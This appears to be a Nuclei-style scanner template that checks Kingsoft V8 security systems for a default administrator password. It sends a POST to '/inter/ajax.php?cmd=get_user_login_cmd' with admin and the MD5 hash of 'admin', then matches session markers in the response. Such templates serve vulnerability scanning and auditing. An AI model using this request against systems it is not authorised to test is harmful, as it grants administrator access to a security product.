id: poc-yaml-kingsoft-v8-weak-pass
info:
  name: Kingsoft V8 Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    This template checks for weak password vulnerability in Kingsoft V8 security system.
http:
  - method: POST
    path:
      - "/inter/ajax.php?cmd=get_user_login_cmd"
    headers:
      Content-Type: application/json;charset=UTF-8
    body: |
      {"get_user_login_cmd":{"name":"admin","password":"21232f297a57a5a743894a0e4a801fc3"}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ADMIN"
      - type: word
        part: body
        words:
          - "userSession"
